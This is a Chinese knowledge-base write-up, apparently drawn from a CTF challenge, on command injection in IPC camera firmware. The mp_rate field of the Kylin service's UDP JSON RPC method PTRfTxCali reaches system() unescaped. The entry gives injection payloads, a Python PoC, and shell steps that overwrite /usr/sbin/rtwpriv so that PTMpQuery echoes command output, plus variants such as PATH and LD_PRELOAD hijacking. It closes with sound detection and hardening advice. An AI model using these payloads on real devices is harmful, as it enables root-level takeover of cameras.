---
id: iot-ipc-json-rpc-mp-rate-command-injection
title: IPC 固件 UDP JSON RPC 命令注入：mp_rate 拼进 system 并覆盖 rtwpriv 回显
type: scenario
domain: iot
path: iot
technique: ipc-json-rpc-mp-rate-command-injection
tags:
- iot
- ipc
- firmware
- json-rpc
- udp
- command-injection
- rtwpriv
- ate
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V115
  verified_at: '2026-11-06T01:51:33+08:00'
  notes: 已对照原文 §28 What's the IPC 核对：Kylin UDP JSON RPC、PTRfTxCali 的 mp_rate 拼进 rtwpriv wlan0 mp_rate 命令注入、无回显、覆盖 /usr/sbin/rtwpriv 为 cat /root/flag.txt 脚本、PTMpQuery 返回 success:<output> 均一致；原文两个实例均实测 flag，未本机复跑。
url: /docs/iot/iot-ipc-json-rpc-mp-rate-command-injection/
draft: false
kb_aliases:
- What's the IPC
- Kylin 服务
- PTRfTxCali
- PTMpQuery
- mp_rate 命令注入
- rtwpriv 覆盖
- ATE 测试接口
---

## 一句话结论

IPC/摄像头固件解包后，用户态主服务 `rootfs-user/bin/Kylin` 暴露 UDP JSON RPC；ATE 测试方法 `PTRfTxCali` 把请求里的 `mp_rate` 字段直接拼进 shell 命令 `rtwpriv wlan0 mp_rate <mp_rate>`，因此 `mp_rate = 1;cat /root/flag.txt;#` 可注入命令。由于该调用没有回显，先把 `/usr/sbin/rtwpriv` 覆盖成打印命令输出的脚本，再调用 `PTMpQuery`，服务端执行 `rtwpriv ... mp_query` 并把输出包在 `success:<output>` 中返回。

## 原理

- **固件与服务**：解包 IPC 固件，定位 `rootfs-user/bin/Kylin`；通过 strings/反汇编找到 UDP JSON RPC 分发和 ATE 测试函数。
- **命令拼接**：`PTRfTxCali` 处理 `mp_rate` 参数时，构造 `rtwpriv wlan0 mp_rate <mp_rate>` 并交给 `system()`/`popen`；没有对 `mp_rate` 做 shell 转义，`;`、`#`、`$()` 等都可注入。
- **无回显问题**：`PTRfTxCali` 只返回成功/失败，不返回命令输出；直接用 `cat` 看不到结果。
- **覆盖 rtwpriv**：`/usr/sbin/rtwpriv` 可写（rootfs 可写或服务以 root 运行），用注入的 `echo`/`printf` 分段写入一个 shell 脚本，内容为 `cat /root/flag.txt` + 哨兵；再 `cp`/`chmod` 覆盖原文件。
- **稳定回显**：`PTMpQuery` 会执行 `rtwpriv ... mp_query`，此时实际运行的是攻击者脚本；服务端把 stdout 包装成 `success:<output>` 返回，解析即可拿到 flag。
- **为什么有效**：ATE RPC 位于调试/产测接口，通常默认开启且缺少鉴权/转义；`rtwpriv` 路径可写使“无回显命令注入”升级为“可回显任意命令执行”。

## 触发条件

- 目标 IPC/摄像头固件运行 Kylin/类似用户态服务，UDP JSON RPC 可达。
- `PTRfTxCali` 的 `mp_rate` 等字段进入 shell 命令拼接，未转义。
- `/usr/sbin/rtwpriv` 可写，或可写入其他会被 `PTMpQuery` 执行的路径。
- `PTMpQuery` 会返回命令输出/可观测副作用。

## 利用步骤

1. 解包固件，定位 `Kylin` 与 ATE RPC 方法；确认 `PTRfTxCali`/`PTMpQuery` 的 UDP 端口与 JSON 格式。
2. 发送 `{"method":"PTRfTxCali","param":{"mp_rate":"1;id;#"}}`，确认命令执行（时间/副作用）。
3. 用注入的 `printf` 分段写 `/tmp/r`：`#!/bin/sh`、`printf %026d`、目标命令、`echo ,,,,`；`cp /tmp/r /usr/sbin/rtwpriv`、`chmod +x`。
4. 调用 `PTMpQuery`，读取 `success:<output>`，去掉 26 个 0 与哨兵，得到命令输出/flag。
5. 若路径不可写，尝试其他会被执行的脚本/配置，或直接盲注逐字符。

## PoC

```python
import json, socket

def udp(method, param=None, timeout=5):
    p = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    p.settimeout(timeout)
    p.sendto(json.dumps({"method": method, "param": param or {}}, separators=(",", ":")).encode(),
             (HOST, PORT))
    try:
        return p.recvfrom(65535)[0]
    finally:
        p.close()

def inject(cmd):
    return udp("PTRfTxCali", {"mp_rate": "1;" + cmd + ";#"})

def query():
    return udp("PTMpQuery", {})
```

安装回显脚本（概念）：

```text
echo '#!/bin/sh'>/tmp/r
printf '...'>/tmp/r   # 逐段追加目标命令
echo 'cat /root/flag.txt'>>/tmp/r
echo 'echo ,,,,'>>/tmp/r
cp /tmp/r /usr/sbin/rtwpriv
chmod +x /usr/sbin/rtwpriv
```

## 变体与关联

- 其他 IPC 固件：ONVIF/RTSP 管理接口、产测 ATE、UDP/TCP JSON RPC；先找 `system`/`popen` 拼接点。
- 无回显时可盲注（时间/副作用/DNS），或覆盖会被其他查询执行的二进制/脚本。
- 若 rootfs 只读，可写 `/tmp` 并通过环境变量/PATH 劫持、`LD_PRELOAD`、配置 include 等方式。
- 关联：IoT 固件命令注入、UDP RPC、无回显命令执行卡。

## 检测与防御

- ATE/调试 RPC 默认关闭或仅产测模式开启；增加鉴权、来源限制与参数白名单。
- 禁止把用户字段拼进 `system`/`popen`，使用 `execve` 参数数组并转义；`mp_rate` 只允许数字。
- rootfs 只读/签名校验，`/usr/sbin` 不可写；服务最小权限，禁用不必要 ATE 方法。
- 检测：UDP JSON RPC 中出现 `;`、`#`、`$(`、`/bin/sh`、`rtwpriv` 覆盖；`/usr/sbin/rtwpriv` 哈希变化；异常 `PTMpQuery` 调用。
